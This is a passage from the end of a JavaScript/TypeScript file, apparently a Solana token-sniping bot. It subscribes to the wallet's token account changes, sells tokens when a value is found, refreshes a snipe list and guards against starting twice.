          if (currValue) { completed = await sell(updatedAccountInfo.accountId, accountData.mint, accountData.amount, currValue); } 
        }
      },
      commitment,
      [ { dataSize: 165 }, { memcmp: { offset: 32, bytes: wallet.publicKey.toBase58() } } ],
    );
  }
  if (USE_SNIPEDLIST) setInterval(loadSnipedList, SNIPE_LIST_REFRESH_INTERVAL);
};

// ==========================================
// تشغيل النظام (مع درع الحماية من التكرار)
// ==========================================
// @ts-ignore
if (!global.__SYSTEM_STARTED__) {
    // @ts-ignore
    global.__SYSTEM_STARTED__ = true;
    runListener();
}
